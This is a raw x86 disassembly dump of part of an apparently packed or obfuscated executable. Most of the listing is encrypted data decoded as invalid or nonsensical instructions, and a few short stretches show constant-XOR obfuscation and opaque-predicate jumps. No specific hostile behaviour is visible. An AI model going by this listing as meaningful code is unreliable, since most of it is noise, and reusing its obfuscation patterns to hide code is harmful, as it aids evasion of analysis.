  40c2ca:	icebp  
  40c2cb:	jmp    0x195592be
  40c2d0:	add    edi,DWORD PTR [ebx+0x2c70854a]
  40c2d6:	jne    0x40c31c
  40c2d8:	mov    cl,0x45
  40c2da:	add    BYTE PTR [edi-0x7ee15555],0xa1
  40c2e1:	adc    eax,0x2968a45a
  40c2e6:	xchg   ebx,eax
  40c2e7:	pusha  
  40c2e8:	aaa    
  40c2e9:	in     eax,dx
  40c2ea:	or     DWORD PTR [ebp-0x6648cc69],esi
  40c2f0:	dec    ebx
  40c2f1:	lods   eax,DWORD PTR ds:[esi]
  40c2f2:	out    0xe8,eax
  40c2f4:	in     al,0x95
  40c2f6:	xchg   ebp,eax
  40c2f7:	fsubr  QWORD PTR ds:0x38fd7219
  40c2fd:	outs   dx,DWORD PTR ds:[esi]
  40c2fe:	xchg   edi,eax
  40c2ff:	lahf   
  40c300:	mov    bh,0xdf
  40c302:	mov    edx,0xb43dbfd7
  40c307:	sahf   
  40c308:	cmp    DWORD PTR [edi+ecx*4-0x33],ecx
  40c30c:	xor    DWORD PTR [esi+0x75],ebp
  40c30f:	push   ss
  40c310:	fidiv  WORD PTR [esi]
  40c312:	inc    ebx
  40c313:	xchg   esi,eax
  40c314:	test   al,0x9d
  40c316:	adc    ah,BYTE PTR [ebx-0x78]
  40c319:	(bad)  
  40c31a:	(bad)  
  40c31b:	xor    eax,0x9b939830
  40c320:	xchg   edi,eax
  40c321:	add    BYTE PTR [ebx+0x17ddd640],0x63
  40c328:	mov    ebx,0x83cdb082
  40c32d:	dec    ebp
  40c32e:	push   DWORD PTR [ecx]
  40c330:	cmp    eax,0xbe958c46
  40c335:	cmovs  esp,DWORD PTR [eax]
  40c338:	mov    ds:0xa8e1e850,eax
  40c33d:	add    BYTE PTR [eax],al
  40c33f:	xor    eax,0x687b
  40c344:	xor    edx,0x18d4
  40c34a:	mov    DWORD PTR [ebp-0x30],eax
  40c34d:	mov    DWORD PTR [ebp-0x2c],edx
  40c350:	mov    eax,ds:0x42272c
  40c355:	cmp    eax,0x7cd80819
  40c35a:	jne    0x40cc06
  40c360:	mov    eax,DWORD PTR [ebp-0x18]
  40c363:	mov    ecx,DWORD PTR [ebp-0x14]
  40c366:	mov    edx,DWORD PTR [ebp-0x18]
  40c369:	mov    esi,DWORD PTR [ebp-0x14]
  40c36c:	shrd   eax,ecx,0x2
  40c370:	shl    edx,0x1e
  40c373:	mov    edx,DWORD PTR ds:0x422518
  40c379:	mov    edx,DWORD PTR [edx+0x1a8]
  40c37f:	shr    ecx,0x2
  40c382:	xor    esi,esi
  40c384:	mov    ecx,0x329e695d
  40c389:	xor    eax,ecx
  40c38b:	or     eax,esi
  40c38d:	mov    DWORD PTR [edx],eax
  40c38f:	mov    eax,DWORD PTR [ebp-0x18]
  40c392:	mov    edx,DWORD PTR [ebp-0x14]
  40c395:	shrd   eax,edx,0x2
  40c399:	shr    edx,0x2
  40c39c:	mov    edx,DWORD PTR [ebp-0x18]
  40c39f:	mov    esi,DWORD PTR [ebp-0x14]
  40c3a2:	xor    eax,ecx
  40c3a4:	xor    esi,esi
  40c3a6:	or     eax,esi
  40c3a8:	mov    ds:0x42272c,eax
  40c3ad:	mov    BYTE PTR [ebp-0x2],0x4f
  40c3b1:	mov    BYTE PTR [ebp-0x1],0xf9
  40c3b5:	movzx  eax,BYTE PTR [ebp-0x1]
  40c3b9:	shl    edx,0x1e
  40c3bc:	mov    dl,BYTE PTR [ebp-0x2]
  40c3bf:	jmp    0x40c7b5
  40c3c4:	(bad)  
  40c3c5:	xor    al,0x5b
  40c3c7:	mov    dl,0x5b
  40c3c9:	call   0x6af2:0x3fac243e
  40c3d0:	hlt    
  40c3d1:	lock aaa 
  40c3d3:	push   0xd
  40c3d5:	std    
  40c3d6:	sbb    BYTE PTR [eax],bl
  40c3d8:	outs   dx,BYTE PTR ds:[esi]
  40c3d9:	adc    bl,BYTE PTR [eax]
  40c3db:	sbb    BYTE PTR [esi+0x7c],cl
  40c3de:	xchg   esp,eax
  40c3df:	es mov bh,0x12
  40c3e2:	out    0x82,al
  40c3e4:	int    0xb2
  40c3e6:	xor    al,BYTE PTR [esi-0xcb2d294]
  40c3ec:	cmp    DWORD PTR [ebp+0x12],ebp
  40c3ef:	pop    ss
  40c3f0:	loop   0x40c3a7
  40c3f2:	stc    
  40c3f3:	cmp    DWORD PTR [ecx],edi
  40c3f5:	xchg   edx,eax
  40c3f6:	mov    DWORD PTR [ecx+0x33740df],0x4e77bd12
  40c400:	sbb    BYTE PTR [ecx-0x4642884b],al
  40c406:	push   ebp
  40c407:	lods   eax,DWORD PTR ds:[esi]
  40c408:	jl     0x40c3e8
  40c40a:	inc    ebp
  40c40b:	aaa    
  40c40c:	inc    edx
  40c40d:	xor    esi,DWORD PTR [ebx]
  40c40f:	outs   dx,DWORD PTR ds:[esi]
  40c410:	(bad)  
  40c411:	pushf  
  40c412:	jle    0x40c3c5
  40c414:	mov    ebx,0x75ca1c2
  40c419:	lods   al,BYTE PTR ds:[esi]
  40c41a:	inc    esi
  40c41b:	adc    ebx,DWORD PTR [edx-0x5bdb30a2]
  40c421:	leave  
  40c422:	in     eax,dx
  40c423:	fwait
  40c424:	push   edi
  40c425:	loope  0x40c482
  40c427:	adc    ch,BYTE PTR [edx]
  40c429:	push   esi
  40c42a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c42b:	arpl   di,bp
  40c42d:	pop    ds
  40c42e:	jbe    0x40c475
  40c430:	cmp    BYTE PTR [edx-0x1ca06329],ah
  40c436:	dec    ebp
  40c437:	jg     0x40c416
  40c439:	mov    edi,0x7d6bb707
  40c43e:	jmp    0x22c4:0x8e62a7bc
  40c445:	das    
  40c446:	ja     0x40c42a
  40c448:	int3   
  40c449:	enter  0xb436,0xb
  40c44d:	mov    al,ds:0x5641c1cf
  40c452:	push   edx
  40c453:	fst    st(2)
  40c455:	sub    ch,BYTE PTR [ebp+0x33d8e40c]
  40c45b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c45c:	or     eax,0x41ba02ec
  40c461:	(bad)  
  40c462:	cmc    
  40c463:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c464:	leave  
  40c465:	out    0x77,eax
  40c467:	xlat   BYTE PTR ds:[ebx]
  40c468:	jmp    DWORD PTR [edx+ecx*2-0x10c60189]
  40c46f:	sahf   
  40c470:	arpl   WORD PTR [eax+0x45c3d737],bx
  40c476:	cmp    eax,0xc41694ea
  40c47b:	sub    DWORD PTR [eax+0xa],edx
  40c47e:	adc    al,ch
  40c480:	rcr    DWORD PTR [eax],cl
  40c482:	imul   edi,DWORD PTR [ecx-0x3b],0x70141560
  40c489:	loopne 0x40c4e9
  40c48b:	test   DWORD PTR [ebx-0x2d50340f],edi
  40c491:	mov    ecx,esi
  40c493:	cmc    
  40c494:	and    al,0x31
  40c496:	sub    dh,ch
  40c498:	sub    ebp,DWORD PTR [edx]
  40c49a:	or     bh,dh
  40c49c:	xchg   esp,eax
  40c49d:	out    dx,al
  40c49e:	jbe    0x40c4d6
  40c4a0:	int    0x10
  40c4a2:	stos   DWORD PTR es:[edi],eax
  40c4a3:	scas   al,BYTE PTR es:[edi]
  40c4a4:	add    bh,dh
  40c4a6:	imul   esp,DWORD PTR [eax],0x738262bc
  40c4ac:	aaa    
  40c4ad:	in     al,0x31
  40c4af:	cmp    DWORD PTR [ecx],0x3a
  40c4b2:	xchg   ebx,eax
  40c4b3:	add    eax,0xd2300cdf
  40c4b8:	clc    
  40c4b9:	inc    edx
  40c4ba:	dec    edx
  40c4bb:	or     eax,0x64ea9712
  40c4c0:	xor    al,0xae
  40c4c2:	bound  esi,QWORD PTR [esi-0x4c]
  40c4c5:	stc    
  40c4c6:	das    
  40c4c7:	mov    ebx,DWORD PTR [ecx]
  40c4c9:	inc    ebx
  40c4ca:	xor    eax,0xd7a1d446
  40c4cf:	int    0x8f
  40c4d1:	retf   0x4ebe
  40c4d4:	push   ebp
  40c4d5:	into   
  40c4d6:	cmp    eax,0x4202a615
  40c4db:	xor    BYTE PTR [edx],ch
  40c4dd:	lods   al,BYTE PTR ds:[esi]
  40c4de:	outs   dx,DWORD PTR ds:[esi]
  40c4df:	shl    DWORD PTR gs:[eax+0x1356c983],0x36
  40c4e7:	push   esi
  40c4e8:	imul   eax,DWORD PTR [edi*8-0x3729610a],0xbedff6da
  40c4f3:	dec    esp
  40c4f4:	aam    0x2e
  40c4f6:	add    esp,DWORD PTR [eax+0x5a463de5]
  40c4fc:	daa    
  40c4fd:	(bad)  
  40c4fe:	mov    dh,0x72
  40c500:	dec    edi
  40c501:	ret    0xc8c3
  40c504:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c505:	lods   eax,DWORD PTR ds:[esi]
  40c506:	cli    
  40c507:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c508:	clc    
  40c509:	add    eax,DWORD PTR [esp+ebp*8+0x45]
  40c50d:	dec    edi
  40c50e:	clc    
  40c50f:	ficomp WORD PTR [eax+edi*1-0x4d]
  40c513:	outs   dx,DWORD PTR ds:[esi]
  40c514:	add    dl,BYTE PTR [esi]
  40c516:	add    BYTE PTR [eax+0xb1eac36],0xf0
  40c51d:	add    BYTE PTR [eax+0x9d21ffa],ch
  40c523:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c524:	sub    esp,DWORD PTR [ebx+0x3a]
  40c527:	sub    ah,bl
  40c529:	xor    al,0xe9
  40c52b:	fst    DWORD PTR [edx+0x78baf86c]
  40c531:	fnstcw WORD PTR [ecx+esi*8]
  40c534:	clc    
  40c535:	inc    ebp
  40c536:	ins    BYTE PTR es:[edi],dx
  40c537:	enter  0xac0f,0x60
  40c53b:	repnz pop edx
  40c53d:	fsubr  DWORD PTR [ebx]
  40c53f:	test   eax,0x5e302ce8
  40c544:	inc    eax
  40c545:	inc    edi
  40c546:	outs   dx,BYTE PTR ds:[esi]
  40c547:	les    ebx,FWORD PTR [esi+0x78]
  40c54a:	pop    edi
  40c54b:	push   esp
  40c54c:	idiv   BYTE PTR [edi+0x4]
  40c54f:	mov    edx,0xed328ef4
  40c554:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40c556:	aam    0x5e
  40c558:	or     DWORD PTR [edx+0x23eca449],esp
  40c55e:	mov    esi,0x3c613dab
  40c563:	fcmovb st,st(7)
  40c565:	icebp  
  40c566:	test   BYTE PTR [ebx-0x11],ch
  40c569:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c56a:	mov    eax,0x1519cadd
  40c56f:	and    edx,DWORD PTR [ebp+0x3a64f7ef]
  40c575:	mov    esi,0xc3895b7d
  40c57a:	ins    BYTE PTR es:[edi],dx
  40c57b:	jae    0x40c584
  40c57d:	jmp    0x7813938
  40c582:	outs   dx,DWORD PTR ds:[esi]
  40c583:	addr16 out dx,eax
  40c585:	or     DWORD PTR [esp+esi*4+0x2b5ff105],esp
  40c58c:	push   eax
  40c58d:	repz push es
  40c58f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c590:	retf   0xd0f5
  40c593:	(bad)  
  40c594:	test   BYTE PTR [ecx+0xa64d9f6],dl
  40c59a:	pop    edi
  40c59b:	call   FWORD PTR [eax-0x3255653e]
  40c5a1:	xchg   edi,eax
  40c5a2:	mov    edi,0x532df6a3
  40c5a7:	pop    es
  40c5a8:	gs sar cl,cl
  40c5ab:	(bad)  
  40c5ac:	in     eax,0xdb
  40c5ae:	sbb    eax,0x960bf7a
  40c5b3:	pop    ss
  40c5b4:	mov    edx,0xa954ffcc
  40c5b9:	lods   eax,DWORD PTR ds:[esi]
  40c5ba:	adc    cl,BYTE PTR [esi-0x70]
  40c5bd:	adc    al,BYTE PTR [ecx-0x6f]
  40c5c0:	adc    al,0xe7
  40c5c2:	arpl   bx,bx
  40c5c4:	outs   dx,DWORD PTR ds:[esi]
  40c5c5:	mov    al,ds:0xc9d26929
  40c5ca:	lock mov cl,0x8d
  40c5cd:	add    bh,bl
  40c5cf:	ins    DWORD PTR es:[edi],dx
  40c5d0:	ins    DWORD PTR es:[edi],dx
  40c5d1:	mov    edi,0x113351ea
  40c5d6:	(bad)  
  40c5d7:	nop
  40c5d8:	jle    0x40c606
  40c5da:	mov    cl,0x2f
  40c5dc:	push   ss
  40c5dd:	(bad)
  40c5e0:	xchg   DWORD PTR [edx],ebp
  40c5e2:	and    eax,0x151abd7f
  40c5e7:	add    DWORD PTR [esi-0x7260f47f],ecx
  40c5ed:	and    esi,DWORD PTR [ebp+0x62]
  40c5f0:	xchg   DWORD PTR [esi],edi
  40c5f2:	pop    ds
  40c5f3:	rol    BYTE PTR [edi],cl
  40c5f5:	jns    0x40c5a7
  40c5f7:	cld    
  40c5f8:	in     eax,dx
  40c5f9:	data16 daa 
  40c5fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5fc:	jecxz  0x40c60d
  40c5fe:	jp     0x40c619
  40c600:	cmp    BYTE PTR [ebx-0x377f26e5],bh
  40c606:	bound  esp,QWORD PTR [ebx-0x5a]
  40c609:	push   eax
  40c60a:	and    eax,0x35c0d318
  40c60f:	cvtps2pi mm2,QWORD PTR [edx-0x1d]
  40c613:	xlat   BYTE PTR ds:[ebx]
  40c614:	sbb    BYTE PTR [edx],bh
  40c616:	push   ebx
  40c617:	mov    edx,0x8b5269ca
  40c61c:	sub    BYTE PTR [ebp+eiz*1-0x3c],dh
  40c620:	sub    dl,BYTE PTR [esi-0x46]
  40c623:	jbe    0x40c6a2
  40c625:	mov    ch,0x23
  40c627:	inc    ecx
  40c628:	int    0xc1
  40c62a:	cdq    
  40c62b:	pop    eax
  40c62c:	into   
  40c62d:	mov    al,0xad
  40c62f:	push   ebp
  40c630:	dec    ebx
  40c631:	test   eax,0xb9349c40
  40c636:	mov    ebp,0xebb3046b
  40c63b:	out    dx,eax
  40c63c:	pop    ebp
  40c63d:	mov    ds:0xba6be81e,eax
  40c642:	or     DWORD PTR [edi-0xe8cfb40],eax
  40c648:	pop    esi
  40c649:	mov    ds:0x7395007e,eax
  40c64e:	not    BYTE PTR [eax]
  40c650:	(bad)  
  40c651:	dec    ebx
  40c652:	pop    ebx
  40c653:	pop    ebp
  40c654:	push   ds
  40c655:	or     BYTE PTR [ecx],bl
  40c657:	ss ja  0x40c687
  40c65a:	sub    al,0x79
  40c65c:	or     ecx,edi
  40c65e:	add    bh,bl
  40c660:	scas   al,BYTE PTR es:[edi]
  40c661:	fndisi(8087 only) 
  40c663:	sub    bh,BYTE PTR [ebp+0x1977df66]
  40c669:	test   DWORD PTR [eax+0x3592896e],esi
  40c66f:	cld    
  40c670:	add    eax,0x67e130fd
  40c675:	pop    esp
  40c676:	out    dx,eax
  40c677:	fwait
  40c678:	dec    eax
  40c679:	pop    ss
  40c67a:	rcr    ecx,1
  40c67c:	in     al,dx
  40c67d:	je     0x40c6b5
  40c67f:	(bad)  
  40c680:	into   
  40c681:	or     al,0xca
  40c683:	sub    ch,dh
  40c685:	pop    esi
  40c686:	ja     0x40c625
  40c688:	xor    ebp,ecx
  40c68a:	and    edx,0xc63e252
  40c690:	or     eax,0xfb00433c
  40c695:	cmc    
  40c696:	and    cl,BYTE PTR [edx+0x74d30164]
  40c69c:	dec    eax
  40c69d:	jb     0x40c6e7
  40c69f:	push   edx
  40c6a0:	or     dh,ah
  40c6a2:	ds xor si,bp
  40c6a6:	and    esp,DWORD PTR [ebp+0x37]
  40c6a9:	lds    ecx,FWORD PTR [edx-0x3c]
  40c6ac:	push   0x1a3a1f30
  40c6b1:	pusha  
  40c6b2:	pop    ds
  40c6b3:	mov    WORD PTR [esi+0x11bdea9],es
  40c6b9:	mov    ds:0xb8d12eee,eax
  40c6be:	lds    edx,FWORD PTR [ebp+0x34bd3e3e]
  40c6c4:	stos   DWORD PTR es:[edi],eax
  40c6c5:	adc    DWORD PTR [edi+0x76],esp
  40c6c8:	push   ss
  40c6c9:	repnz std 
  40c6cb:	sbb    DWORD PTR [edx+0x38219f34],edx
  40c6d1:	mov    al,0x42
  40c6d3:	or     al,0x9b
  40c6d5:	std    
  40c6d6:	xchg   edx,eax
  40c6d7:	or     DWORD PTR [ecx-0x1a],0xfa0ebbf0
  40c6de:	cmp    ch,BYTE PTR [esi]
  40c6e0:	in     al,0x9a
  40c6e2:	dec    eax
  40c6e3:	es push esp
  40c6e5:	and    al,0xd6
  40c6e7:	xor    eax,0x9cbb894c
  40c6ec:	mov    cl,0xe2
  40c6ee:	inc    ecx
  40c6ef:	mov    ebx,0x90e856da
  40c6f4:	pop    esi
  40c6f5:	(bad)  
  40c6f7:	inc    eax
  40c6f8:	pop    ecx
  40c6f9:	ins    BYTE PTR es:[edi],dx
  40c6fa:	gs mov ecx,0x2061f1a7
  40c700:	(bad)  
  40c701:	push   ecx
  40c702:	imul   eax,DWORD PTR [esi+0x752ab8a0],0x14
  40c709:	inc    edi
  40c70a:	xchg   ecx,eax
  40c70b:	add    dl,0x9d
  40c70e:	and    dh,ah
  40c710:	mov    ebx,DWORD PTR [ebp+0x52562fa8]
  40c716:	mov    edx,cs
  40c718:	mov    ds:0x7150c8bb,al
  40c71d:	fnstsw WORD PTR [ecx-0x19]
  40c720:	pop    ebp
  40c721:	xchg   ecx,eax
  40c722:	pop    ebx
  40c723:	js     0x40c791
  40c725:	pop    eax
  40c726:	(bad)  
  40c727:	and    al,0xd7
  40c729:	fisub  WORD PTR [esi]
  40c72b:	outs   dx,BYTE PTR ds:[esi]
  40c72c:	mov    eax,0xa325efe7
  40c731:	int    0x23
  40c733:	and    bh,BYTE PTR fs:[esi]
  40c736:	out    0x79,eax
  40c738:	sub    BYTE PTR [ecx-0x2e3e8b35],0x40
  40c73f:	xor    BYTE PTR [ebx],bh
  40c741:	sbb    ebx,ebp
  40c743:	ret    
  40c744:	sub    ah,ah
  40c746:	and    DWORD PTR ds:0xf565bc1a,ebx
  40c74c:	(bad)  
  40c74d:	jnp    0x40c738
  40c74f:	or     esp,ecx
  40c751:	rol    bh,1
  40c753:	fbld   TBYTE PTR ds:0x1fdc6fc0
  40c759:	aam    0x15
  40c75b:	popf   
  40c75c:	xchg   edi,eax
  40c75d:	xor    dh,0xf5
  40c760:	mov    cl,0x63
  40c762:	mov    WORD PTR [ebx],fs
  40c764:	enter  0xf84f,0x44
  40c768:	push   es
  40c769:	cmp    cl,dh
  40c76b:	scas   al,BYTE PTR es:[edi]
  40c76c:	jmp    0xeb47dc98
  40c771:	es aad 0x32
  40c774:	xchg   edi,esi
  40c776:	sub    esp,ebp
  40c778:	jo     0x40c788
  40c77a:	into   
  40c77b:	cmc    
  40c77c:	div    BYTE PTR [ecx+edi*2+0x60]
  40c780:	cmp    eax,DWORD PTR [edx]
  40c782:	or     BYTE PTR [edx-0x5265bae],dh
  40c788:	xor    BYTE PTR [ebp+0x4ce2abb],dl
  40c78e:	and    ebp,edx
  40c790:	xchg   edx,eax
  40c791:	adc    al,0xf
  40c793:	stos   DWORD PTR es:[edi],eax
  40c794:	mov    ah,0x72
  40c796:	nop
  40c797:	inc    esp
  40c798:	scas   eax,DWORD PTR es:[edi]
  40c799:	retf   
  40c79a:	cmp    ecx,ebx
  40c79c:	mov    ebp,0xa9a7ecf0
  40c7a1:	fcomp  st(0)
  40c7a3:	inc    ebp
  40c7a4:	enter  0x218b,0x9d
  40c7a8:	mov    cl,0xcf
  40c7aa:	mov    BYTE PTR [ebp-0x28],ch
  40c7ad:	shr    DWORD PTR [esi-0x3c77f53a],0xf
  40c7b4:	in     al,0x34
  40c7b6:	inc    edx
  40c7b7:	add    al,dl
  40c7b9:	push   0x6
  40c7bb:	add    eax,0xfa
  40c7c0:	mov    BYTE PTR [ebp-0x4],al
  40c7c3:	mov    BYTE PTR [ebp-0x3],0x67
  40c7c7:	pop    eax
  40c7c8:	mov    BYTE PTR [ebp-0x1],al
  40c7cb:	mov    BYTE PTR [ebp-0x2],0x3
  40c7cf:	mov    dl,BYTE PTR [ebp-0x2]
  40c7d2:	movzx  esi,dl
  40c7d5:	cdq    
  40c7d6:	idiv   esi
  40c7d8:	mov    dl,BYTE PTR [ebp-0x1]
  40c7db:	add    al,dl
  40c7dd:	mov    dl,BYTE PTR [ebp-0x3]
  40c7e0:	or     al,dl
  40c7e2:	mov    dl,BYTE PTR [ebp-0x4]
  40c7e5:	add    al,0x3a
  40c7e7:	cmp    dl,al
  40c7e9:	jmp    0x40cbdf
  40c7ee:	xchg   esi,eax
  40c7ef:	and    al,dl
  40c7f1:	cmc    
  40c7f2:	mov    ds:0xdc222674,al
  40c7f7:	mov    cl,BYTE PTR [edi-0x9654990]
  40c7fd:	push   0x63
  40c7ff:	cmc    
  40c800:	sbb    BYTE PTR [eax],bl
  40c802:	outs   dx,BYTE PTR ds:[esi]
  40c803:	adc    bl,BYTE PTR [eax]
  40c805:	sbb    BYTE PTR [edi+0x59],al
  40c808:	cdq    
  40c809:	sub    BYTE PTR [eax+0x67],bh
  40c80c:	and    ebx,ebp
  40c80e:	mov    ebx,0xbb84b070
  40c813:	call   0xa6b0:0x6d883bd7
  40c81a:	jbe    0x40c867
  40c81c:	push   cs
  40c81d:	xlat   BYTE PTR ds:[ebx]
  40c81e:	mov    DWORD PTR [esi+0x27],0xf28cdaaf
  40c825:	addr16 jne 0x40c855
  40c828:	div    BYTE PTR [edi+eax*4-0x447bf165]
  40c82f:	into   
  40c830:	cdq    
  40c831:	imul   eax,DWORD PTR [edi],0xffffffee
  40c834:	dec    edx
  40c835:	adc    dl,BYTE PTR [eax+0x2e16a693]
  40c83b:	sar    esp,1
  40c83d:	cmp    eax,0xccf73a0d
  40c842:	sahf   
  40c843:	push   cs
  40c844:	popa   
  40c845:	xor    al,0x4f
  40c847:	mov    edx,0xcada7e04
  40c84c:	mov    ah,0xf0
  40c84e:	inc    esi
  40c84f:	dec    ecx
  40c850:	push   ebx
  40c851:	pop    esi
  40c852:	pop    esi
  40c853:	add    edi,esi
  40c855:	cdq    
  40c856:	cmp    DWORD PTR [ecx-0x7cbf5db4],ebx
  40c85c:	in     eax,dx
  40c85d:	adc    dh,0x2c
  40c860:	aam    0xd0
  40c862:	push   es
  40c863:	jae    0x40c7e5
  40c865:	xchg   DWORD PTR [ecx+0x63],esi
  40c868:	test   DWORD PTR [ebx+0x7f],esp
  40c86b:	xchg   esp,eax
  40c86c:	xchg   bh,bl
  40c86e:	xor    DWORD PTR [edi+esi*4+0x1b],esi
  40c872:	in     eax,0x2b
  40c874:	mov    ah,0x84
  40c876:	mov    dh,BYTE PTR [edi-0x3c55fdb0]
  40c87c:	stos   BYTE PTR es:[edi],al
  40c87d:	sub    ecx,ecx
  40c87f:	arpl   WORD PTR [ecx],ax
  40c881:	inc    esi
  40c882:	sbb    esi,DWORD PTR [esi]
  40c884:	cmp    cl,BYTE PTR [edi+esi*2]
  40c887:	out    0x8a,al
  40c889:	imul   esp,DWORD PTR [ebx-0x57],0x16c41037
  40c890:	out    dx,al
  40c891:	push   esp
  40c892:	xor    eax,0xb23573b3
  40c897:	add    al,0xa
  40c899:	cwde   
  40c89a:	pop    esi
  40c89b:	mov    bl,0x64
  40c89d:	test   cl,dh
  40c89f:	leave  
  40c8a0:	sub    cl,BYTE PTR [edi]
  40c8a2:	adc    al,0xd8
  40c8a4:	fwait
  40c8a5:	sub    DWORD PTR [esi],0xffffff8d
  40c8a8:	test   BYTE PTR [eax],dh
  40c8aa:	pop    esi
  40c8ab:	sbb    esp,DWORD PTR [edx+eax*4]
  40c8ae:	sub    DWORD PTR [ebx],esi
  40c8b0:	mov    ch,0xd5
  40c8b2:	js     0x40c929
  40c8b4:	push   es
  40c8b5:	pop    ebp
  40c8b6:	lahf   
  40c8b7:	cli    
  40c8b8:	cmc    
  40c8b9:	ds xchg edx,eax
  40c8bb:	jno    0x40c936
  40c8bd:	(bad)  
  40c8be:	aam    0x31
  40c8c0:	dec    BYTE PTR [ebp-0x79]
  40c8c3:	jns    0x40c907
  40c8c5:	push   es
  40c8c6:	push   eax
  40c8c7:	fild   DWORD PTR [esi+0x2aaff931]
  40c8cd:	xor    edx,DWORD PTR [esi]
  40c8cf:	push   cs
  40c8d0:	and    al,0xac
  40c8d2:	xchg   esi,eax
  40c8d3:	add    DWORD PTR [ecx+0x19a6b281],eax
  40c8d9:	or     dl,al
  40c8db:	mov    DWORD PTR [eax],0xd2b65b4
  40c8e1:	lea    esi,[edi-0x4c]
  40c8e4:	pushw  0xfff2
  40c8e7:	loope  0x40c8d7
  40c8e9:	aas    
  40c8ea:	mov    ds,WORD PTR [ebx+ecx*2]
  40c8ed:	je     0x40c92b
  40c8ef:	daa    
  40c8f0:	jle    0x40c8ce
  40c8f2:	leave  
  40c8f3:	lods   eax,DWORD PTR ds:[esi]
  40c8f4:	in     al,0x0
  40c8f6:	stc    
  40c8f7:	and    ch,BYTE PTR [eax]
  40c8f9:	pushf  
  40c8fa:	inc    esp
  40c8fb:	jp     0x40c908
  40c8fd:	inc    esi
  40c8fe:	gs retf 0xdc8e
  40c902:	enter  0xdc97,0xae
  40c906:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c907:	popf   
  40c908:	sub    eax,0x3e877e70
  40c90d:	leave  
  40c90e:	mov    BYTE PTR [ebx+0x15cab6f5],cl
  40c914:	hlt    
  40c915:	adc    cl,dl
  40c917:	loop   0x40c960
  40c919:	push   ebp
  40c91a:	cmp    al,0xe7
  40c91c:	ins    DWORD PTR es:[edi],dx
  40c91d:	mov    bl,0x58
  40c91f:	es dec edi
  40c921:	mov    fs,edi
  40c923:	lods   al,BYTE PTR ds:[esi]
  40c924:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c925:	bound  ecx,QWORD PTR [edx-0x61]
  40c928:	out    0x29,eax
  40c92a:	hlt    
  40c92b:	jno    0x40c97d
  40c92d:	xor    BYTE PTR [ecx+0x1e],0x66
  40c931:	inc    esp
  40c932:	fisttp WORD PTR [ebp+edx*4+0x7482dd17]
  40c939:	mov    dh,0xf5
  40c93b:	repz sub BYTE PTR [edx+0x75],bh
  40c93f:	ja     0x40c98b
  40c941:	pop    ds
  40c942:	retf   0x7863
  40c945:	adc    eax,0xb40925da
  40c94a:	(bad)  
  40c94b:	out    dx,eax
  40c94c:	xor    BYTE PTR [ecx],cl
  40c94e:	or     eax,DWORD PTR [ecx]
  40c950:	dec    ebx
  40c951:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c952:	mov    al,0x2d
  40c954:	sbb    bh,al
  40c956:	into   
  40c957:	stos   BYTE PTR es:[edi],al
  40c958:	ins    DWORD PTR es:[edi],dx
  40c959:	xchg   edi,eax
  40c95a:	in     eax,0x56
  40c95c:	push   0x68
  40c95e:	dec    esp
  40c95f:	and    BYTE PTR [ecx+0xd476e52],dl
  40c965:	aaa    
  40c966:	add    ebx,DWORD PTR [edx+eiz*4+0x3e15f31c]
  40c96d:	xchg   ebp,eax
  40c96e:	stc    
  40c96f:	jle    0x40c9e5
  40c971:	xchg   edi,eax
  40c972:	fisub  DWORD PTR [ecx]
  40c974:	cmp    ebp,DWORD PTR [ebx]
  40c976:	in     eax,0x21
  40c978:	dec    ebx
  40c979:	and    BYTE PTR [edx+0x3c],al
  40c97c:	cmp    al,0x7a
  40c97e:	dec    esp
  40c97f:	dec    edx
  40c980:	icebp  
  40c981:	pop    ebx
  40c982:	sub    edi,edi
  40c984:	inc    edx
  40c985:	stos   DWORD PTR es:[edi],eax
  40c986:	outs   dx,BYTE PTR ds:[esi]
  40c987:	mov    ds:0x3c5f6631,al
  40c98c:	jmp    0x40c9f4
  40c98e:	pusha  
  40c98f:	sbb    eax,DWORD PTR [ebp-0x4f]
  40c992:	cwde   
  40c993:	push   esi
  40c994:	pop    ds
  40c995:	pop    ecx
  40c996:	daa    
  40c997:	dec    edx
  40c998:	inc    ebp
  40c999:	or     eax,0x9bb73532
  40c99e:	lea    esp,[edi+ecx*4]
  40c9a1:	(bad)  
  40c9a2:	outs   dx,DWORD PTR ds:[esi]
  40c9a3:	xor    eax,0xf58286e6
  40c9a8:	arpl   si,bp
  40c9aa:	xor    edx,DWORD PTR [edi+0x7eeada28]
  40c9b0:	arpl   WORD PTR [edx+0x1fb15ba1],sp
  40c9b6:	inc    esi
  40c9b7:	in     eax,0x30
  40c9b9:	adc    ecx,edi
  40c9bb:	jb     0x40c9aa
  40c9bd:	push   es
  40c9be:	push   cs
  40c9bf:	sub    BYTE PTR [edi],0x2b
  40c9c2:	pop    ebx
  40c9c3:	stc    
  40c9c4:	mov    dl,0xe5
  40c9c6:	fst    DWORD PTR [esi*4-0x622b42e1]
  40c9cd:	(bad)  
  40c9ce:	pusha  
  40c9cf:	and    al,0xec
  40c9d1:	pushf  
  40c9d2:	inc    eax
  40c9d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9d4:	jo     0x40c9e7
  40c9d6:	jb     0x40c98c
  40c9d8:	stos   DWORD PTR es:[edi],eax
  40c9d9:	shl    BYTE PTR [eax],1
  40c9db:	shl    BYTE PTR [esi+ebp*2],cl
  40c9de:	(bad)
  40c9e1:	dec    ebp
  40c9e2:	ds jge 0x40ca3b
  40c9e5:	sub    ah,BYTE PTR [ecx+0x6d204472]
  40c9eb:	ja     0x40c974
  40c9ed:	sbb    al,0xea
  40c9ef:	and    al,0xb7
  40c9f1:	cmp    dl,BYTE PTR [esi]
  40c9f3:	daa    
  40c9f4:	rol    esp,cl
  40c9f6:	loope  0x40ca15
  40c9f8:	aaa    
  40c9f9:	sti    
  40c9fa:	mov    esi,0x137aac95
  40c9ff:	xor    al,0x1
  40ca01:	das    
